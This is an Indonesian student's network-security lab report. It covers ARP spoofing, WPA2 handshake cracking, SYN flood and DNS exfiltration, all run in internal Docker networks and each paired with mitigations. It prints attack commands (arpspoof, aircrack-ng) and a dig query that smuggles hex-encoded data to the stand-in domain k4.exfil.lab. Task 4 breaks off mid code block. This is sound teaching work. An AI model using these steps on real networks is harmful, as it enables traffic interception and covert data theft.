# JAWABAN UTS KEAMANAN JARINGAN
## Kasus 4

Nama: Ratna Muslimmah Ahmad
NIM: 24552011338
Mata Kuliah: Keamanan Jaringan

---

# TUGAS 1 — DOCKER VOLUME PERSISTENCE

## A. Membuat Docker Volume
Perintah:
docker volume create vol-k4

Hasil:
Volume vol-k4 berhasil dibuat.

## B. Menguji Persistence
Container w-k4 digunakan untuk membuat file laporan-k4.txt
yang berisi NIM 24552011338.

Setelah container dihapus, file berhasil dibaca kembali
menggunakan volume yang sama.

Hasil:
24552011338

## C. Komunikasi Antarcontainer
Container attacker berhasil mengakses container target
melalui hostname target menggunakan HTTP.

Hasil:
Welcome to nginx!

Kesimpulan:
Docker Volume mempertahankan data meskipun container
dihapus. Docker Compose juga memungkinkan komunikasi
antarcontainer melalui jaringan internal.


### Bukti Pengujian Docker Volume Persistence

![TUGAS 1 VOLUME PERSISTENCE KASUS 4](bukti/task-1/TUGAS%201%20VOLUME%20PERSISTENCE%20KASUS%204.png)

### Bukti Konektivitas Docker Compose

![TUGAS 1 KONEKTIVITAS DOCKER COMPOSE KASUS 4](bukti/task-1/TUGAS%201%20KONEKTIVITAS%20DOCKER%20COMPOSE%20KASUS%204.png)

---

# TUGAS 2 — ENKRIPSI DAN SERTIFIKAT DIGITAL

## A. Enkripsi AES-256
Algoritma: AES-256-CBC
Password: kunci-k4-2026
File asli: laporan-k4.txt
File terenkripsi: laporan-k4.enc

Status: Berhasil.

## B. Dekripsi
File laporan-k4.enc berhasil didekripsi menjadi
hasil-k4.txt.

Hasil:
isi laporan k4

Status: Berhasil.

## C. SHA-256
Menunggu hasil verifikasi hash.

### Hasil Pengujian SHA-256

Hash file asli:
5b8213129068e6fc0f3b84877a252139b64d62447015e620642038aa92130494

Hash file hasil dekripsi:
5b8213129068e6fc0f3b84877a252139b64d62447015e620642038aa92130494

Kesimpulan:
Kedua hash SHA-256 identik. Hal ini membuktikan bahwa
file hasil dekripsi memiliki isi yang sama dengan file asli
dan integritas data berhasil dipertahankan.

## D. Pembuatan Sertifikat Digital

Sertifikat digital dibuat menggunakan OpenSSL dengan
algoritma RSA 2048-bit dan masa berlaku 30 hari.

Common Name (CN): k4.exfil.lab
Subject: CN=k4.exfil.lab
Issuer: CN=k4.exfil.lab

Masa berlaku:
25 November 2026 sampai 25 Desember 2026.

### Analisis

Sertifikat yang dibuat merupakan self-signed certificate,
yaitu sertifikat yang ditandatangani oleh pemiliknya sendiri.

Hal ini dibuktikan dengan nilai Subject dan Issuer
yang sama, yaitu CN=k4.exfil.lab.

### Perbedaan Self-Signed dan CA-Signed

Self-signed certificate ditandatangani sendiri oleh pemilik
sertifikat sehingga tidak otomatis dipercaya oleh browser.

Sementara itu, CA-signed certificate ditandatangani oleh
Certificate Authority yang dipercaya dan dapat diverifikasi
melalui rantai sertifikat.

Self-signed umumnya digunakan untuk pengujian lokal,
sedangkan CA-signed digunakan pada layanan publik.

Kesimpulan:
Pembuatan sertifikat digital self-signed berhasil
dilakukan menggunakan OpenSSL.


### Bukti Verifikasi SHA-256

![TUGAS 2 SHA256 KASUS 4](bukti/task-2/TUGAS%202%20SHA256%20KASUS%204.png)

### Bukti Sertifikat Self-Signed

![TUGAS 2 SERTIFIKAT SELF SIGNED KASUS 4](bukti/task-2/TUGAS%202%20SERTIFIKAT%20SELF%20SIGNED%20KASUS%204.png)


# TUGAS 3 — ARP SPOOFING DAN MITIGASI

## A. Lingkungan Pengujian

Simulasi dilakukan menggunakan tiga container Docker
pada jaringan internal `lab-arp-k4`.

| Container | IP Address | MAC Address |
|---|---|---|
| Korban | 172.18.0.2 | 56:f3:c4:3c:29:bb |
| Gateway | 172.18.0.3 | 0a:5e:cf:2f:ac:0e |
| Penyerang | 172.18.0.4 | 3e:9f:73:c1:dc:08 |

Jaringan dibuat menggunakan opsi `--internal` agar
simulasi hanya berlangsung di lingkungan Docker lokal.

## B. Kondisi ARP Sebelum Serangan

Sebelum simulasi, korban melakukan ping ke gateway
untuk mempelajari alamat MAC gateway melalui ARP.

Hasil `arp -a`:

gateway-k4 (172.18.0.3) at 0a:5e:cf:2f:ac:0e

Pemetaan IP dan MAC gateway masih benar.

## C. Simulasi ARP Spoofing

Simulasi dilakukan menggunakan `arpspoof` dari
container penyerang dengan durasi maksimal 20 detik.

Perintah:
`timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3`

Hasil `arp -a` pada korban:

gateway-k4 (172.18.0.3) at 3e:9f:73:c1:dc:08

MAC Address gateway berubah menjadi MAC Address
penyerang, yaitu 3e:9f:73:c1:dc:08.

Hal ini menunjukkan bahwa ARP spoofing berhasil
memanipulasi ARP cache korban.

## D. Mitigasi Menggunakan Static ARP

Perintah:
`arp -s 172.18.0.3 0a:5e:cf:2f:ac:0e`

Hasil `arp -a` setelah mitigasi:

gateway-k4 (172.18.0.3) at 0a:5e:cf:2f:ac:0e PERM

Status PERM menunjukkan bahwa entri gateway telah
ditetapkan secara permanen sehingga tidak mudah
digantikan oleh informasi ARP dinamis yang palsu.

## E. Pengujian Setelah Mitigasi

Perintah:
`ping -c 3 172.18.0.3`

Hasil:
- Paket terkirim: 3
- Paket diterima: 3
- Packet loss: 0%

Koneksi korban ke gateway tetap berjalan setelah
mitigasi Static ARP diterapkan.

## F. Analisis dan Mitigasi Tambahan

ARP spoofing merupakan serangan yang memanfaatkan
kelemahan protokol ARP karena protokol tersebut
tidak memiliki mekanisme autentikasi bawaan.

Penyerang mengirimkan pesan ARP palsu agar korban
mengasosiasikan IP gateway dengan MAC Address
milik penyerang. Akibatnya, lalu lintas jaringan
dapat dialihkan melalui perangkat penyerang.

Selain Static ARP, mitigasi lain adalah Dynamic
ARP Inspection (DAI). DAI memvalidasi paket ARP
berdasarkan informasi pengikatan IP dan MAC yang
terpercaya, misalnya melalui DHCP Snooping.
Dengan demikian, paket ARP yang tidak sesuai
dapat diblokir oleh switch yang mendukung fitur ini.

## Kesimpulan

Simulasi ARP spoofing berhasil dilakukan dalam
jaringan Docker internal. Perubahan MAC Address
gateway pada tabel ARP korban membuktikan bahwa
serangan berhasil. Mitigasi Static ARP berhasil
mengembalikan dan mempertahankan pemetaan MAC
gateway yang benar. Pengujian ping menunjukkan
konektivitas tetap berjalan dengan packet loss 0%.

### Bukti ARP Sebelum Spoofing

![TUGAS 3 ARP SEBELUM SPOOFING KASUS 4](bukti/task-3/TUGAS%203%20ARP%20SEBELUM%20SPOOFING%20KASUS%204.png)

### Bukti ARP Setelah Spoofing

![TUGAS 3 ARP SETELAH SPOOFING KASUS 4](bukti/task-3/TUGAS%203%20ARP%20SETELAH%20SPOOFING%20KASUS%204.png)

### Bukti Static ARP Mitigation

![TUGAS 3 STATIC ARP MITIGATION KASUS 4](bukti/task-3/TUGAS%203%20STATIC%20ARP%20MITIGATION%20KASUS%204.png)

### Tugas 4 — Analisis WPA2 Handshake

**File yang diuji:**
- Capture: `samples/handshake-k4.cap`
- Wordlist: `samples/wordlist-k4.txt`

**Perintah pengujian:**
```powershell
docker run --rm --mount "type=bind,source=$($PWD.Path),target=/work" uts-kali-tools aircrack-ng -w /work/samples/wordlist-k4.txt /work/samples/handshake-k4.cap

### Tugas 5 — ICMP dengan Scapy

**Tujuan:** Mengirim ICMP Echo Request menggunakan Scapy dan mengamati TTL serta tipe ICMP pada paket balasan.

**Lingkungan pengujian:**
- Jaringan Docker: `lab-arp-k4` (internal)
- Container korban: `korban-k5`
- IP korban: `172.18.0.2`
- IP penguji: `172.18.0.3`

**Perintah pengujian:**

```powershell
docker run --rm --network lab-arp-k4 --mount "type=bind,source=$($PWD.Path),target=/work" uts-kali-tools python3 /work/kasus/k5-scapy/kirim_icmp.py 172.18.0.2
```

**Hasil pengujian:**

```text
Mengirim: IP / ICMP 172.18.0.3 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

**Analisis:**

Pengujian berhasil. Container korban memberikan balasan ICMP Echo Reply dengan TTL sebesar 64. Tipe ICMP 0 menunjukkan bahwa paket yang diterima merupakan Echo Reply sebagai respons terhadap Echo Request yang dikirim menggunakan Scapy.

**Penjelasan Smurf Attack:**

Smurf Attack adalah serangan Denial of Service (DoS) yang memanfaatkan ICMP Echo Request dan IP spoofing. Penyerang memalsukan alamat IP sumber menjadi alamat IP korban, kemudian mengirim permintaan ke alamat broadcast. Perangkat yang menerima permintaan tersebut akan mengirimkan balasan ke korban sehingga menghasilkan trafik dalam jumlah besar.

**Mitigasi:**
1. Menonaktifkan IP directed broadcast.
2. Menerapkan ingress dan egress filtering.
3. Memblokir paket dengan alamat sumber yang tidak valid.
4. Membatasi trafik ICMP sesuai kebutuhan jaringan.

**Kesimpulan:**

Scapy berhasil mengirim ICMP Echo Request dan menerima Echo Reply dari container korban. TTL balasan sebesar 64 dan tipe ICMP 0 membuktikan bahwa komunikasi ICMP berjalan dengan baik di jaringan Docker internal.

### Tugas 6 — SYN Flood dan TCP Three-Way Handshake

**Tujuan:** Mengamati proses TCP Three-Way Handshake dan melakukan simulasi SYN Flood pada jaringan Docker internal.

**Lingkungan pengujian:**
- Target: `k4-target-1`
- Attacker: `k4-attacker-1`
- Jaringan: `k4_lab` (internal)
- Port target: TCP 80

**Hasil pengukuran SYN_RECV:**

| Kondisi | Jumlah SYN_RECV |
|---|---:|
| Sebelum simulasi | 0 |
| Pemeriksaan setelah simulasi | 0 |

Simulasi SYN menggunakan hping3 dibatasi maksimal 15 detik. Namun, pengukuran setelah perintah dijalankan menunjukkan 0 koneksi SYN_RECV. Dengan demikian, peningkatan koneksi SYN_RECV belum berhasil dibuktikan.

**Bukti TCP Three-Way Handshake:**

Pengujian koneksi HTTP dari attacker ke target menghasilkan HTTP status `200 OK`.

Hasil tcpdump menunjukkan:

1. SYN (`[S]`): attacker meminta koneksi kepada target.
2. SYN-ACK (`[S.]`): target merespons permintaan koneksi.
3. ACK (`[.]`): attacker mengonfirmasi koneksi.

**Penjelasan SYN Flood:**

SYN Flood merupakan serangan Denial of Service yang membanjiri server dengan paket TCP SYN. Server merespons setiap permintaan dengan SYN-ACK dan menyediakan sumber daya untuk menunggu ACK terakhir. Jika banyak permintaan tidak menyelesaikan proses handshake, koneksi setengah terbuka dapat menumpuk dan mengganggu ketersediaan layanan.

**Mitigasi:**

1. Mengaktifkan SYN Cookies.
2. Menerapkan firewall dan rate limiting untuk paket SYN.
3. Menggunakan sistem IDS/IPS untuk mendeteksi pola trafik mencurigakan.
4. Membatasi koneksi baru berdasarkan kebijakan jaringan.

**Kesimpulan:**

Pengujian TCP Three-Way Handshake berhasil dibuktikan melalui paket SYN, SYN-ACK, dan ACK. Sementara itu, peningkatan SYN_RECV akibat simulasi SYN Flood belum teramati sehingga hasil serangan tidak dapat dinyatakan berhasil.

## Task 7 — DNS Exfiltration dan Deteksi

### A. Tujuan
Melakukan simulasi DNS exfiltration di lingkungan Docker internal dengan mengubah NIM menjadi representasi hexadecimal, kemudian mengirimkannya sebagai bagian dari subdomain `k4.exfil.lab`. Selanjutnya, melakukan analisis log DNS dan mengembalikan data hexadecimal ke bentuk NIM semula.

### B. Konversi NIM ke Hexadecimal

NIM: `24552011338`

Hasil konversi hexadecimal:

`3234353532303131333338`

Hexadecimal tersebut digunakan sebagai label subdomain:

`3234353532303131333338.k4.exfil.lab`

### C. Pengiriman DNS Query

Query dikirim dari container attacker menuju DNS server dengan alamat `172.19.0.3`.

Perintah:

```bash
dig @172.19.0.3 3234353532303131333338.k4.exfil.lab A
```

Hasil pengujian:
- Status DNS: `NOERROR`
- DNS server: `172.19.0.3`
- IP address jawaban: `10.0.0.99`

Hasil tersebut menunjukkan bahwa DNS server berhasil menerima dan merespons query yang membawa data hexadecimal pada nama domain.

### D. Pencatatan Log DNS

Berdasarkan log `dnsmasq`, diperoleh catatan:

```text
query[A] 3234353532303131333338.k4.exfil.lab from 172.19.0.2
config 3234353532303131333338.k4.exfil.lab is 10.0.0.99
```

Log menunjukkan bahwa container attacker dengan IP `172.19.0.2` mengirimkan query DNS yang berisi label hexadecimal NIM. DNS server kemudian memberikan jawaban `10.0.0.99`.

### E. Analisis Log DNS

Analisis dilakukan menggunakan script `analisis_dns.py`.

Hasil eksekusi:

```text
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):
```

Script berhasil menghitung satu query pada domain induk `exfil.lab`. Namun, query tidak masuk kategori mencurigakan karena script menetapkan batas panjang label lebih dari 30 karakter, sedangkan label hexadecimal NIM hanya memiliki 22 karakter.

Hal ini menunjukkan keterbatasan deteksi berdasarkan panjang label. Script perlu dikembangkan agar dapat mendeteksi pola hexadecimal yang mencurigakan meskipun panjang labelnya kurang dari 30 karakter.

### F. Decode Hexadecimal

Untuk membuktikan bahwa data dapat dikembalikan ke bentuk aslinya, dilakukan proses decoding menggunakan perintah:

```bash
echo 3234353532303131333338 | xxd -r -p
```

Hasil:

```text
24552011338
```

Hasil decoding sama dengan NIM asli sehingga proses encoding dan decoding berhasil.

### G. Analisis dan Mitigasi

DNS exfiltration merupakan teknik penyalahgunaan protokol DNS untuk mengirimkan data melalui nama domain dalam DNS query. Informasi dapat dikonversi menjadi hexadecimal atau format lain, kemudian dimasukkan ke dalam label subdomain.

Beberapa langkah mitigasi yang dapat diterapkan:

1. Membatasi komunikasi DNS keluar agar hanya menggunakan DNS resolver yang telah diizinkan.
2. Memantau log DNS untuk menemukan pola query yang tidak biasa.
3. Mendeteksi label subdomain dengan panjang berlebihan, karakter hexadecimal, atau tingkat entropi tinggi.
4. Membatasi jumlah query DNS dalam periode tertentu untuk mengidentifikasi aktivitas yang tidak normal.
5. Menerapkan DNS filtering dan kebijakan firewall untuk membatasi akses ke domain yang tidak tepercaya.

### H. Kesimpulan

Simulasi DNS exfiltration berhasil dilakukan pada jaringan Docker internal. NIM berhasil dikonversi menjadi hexadecimal dan dikirim sebagai subdomain `k4.exfil.lab`. DNS server berhasil menerima query, memberikan respons `10.0.0.99`, dan mencatat aktivitas tersebut pada log. Data hexadecimal juga berhasil dikembalikan menjadi NIM asli.

Script analisis berhasil membaca dan menghitung query, tetapi belum menandai label hexadecimal sebagai aktivitas mencurigakan karena panjangnya belum melewati ambang deteksi 30 karakter. Oleh karena itu, aturan deteksi perlu dikembangkan agar dapat mengenali pola DNS exfiltration dengan lebih baik.


### Bukti Pengujian DNS Query

![TUGAS 7 DIG KASUS 4](bukti/task-7/TUGAS%207%20DIG%20KASUS%204.png)

### Bukti Log DNS

![TUGAS 7 LOG DNS KASUS 4](bukti/task-7/TUGAS%207%20LOG%20DNS%20KASUS%204.png)

### Bukti Hasil Analisis DNS

![TUGAS 7 HASIL ANALISIS KASUS 4](bukti/task-7/TUGAS%207%20HASIL%20ANALISIS%20KASUS%204.png)

### Bukti Decoding NIM

![TUGAS 7 DECODE KASUS 4](bukti/task-7/TUGAS%207%20DECODE%20KASUS%204.png)
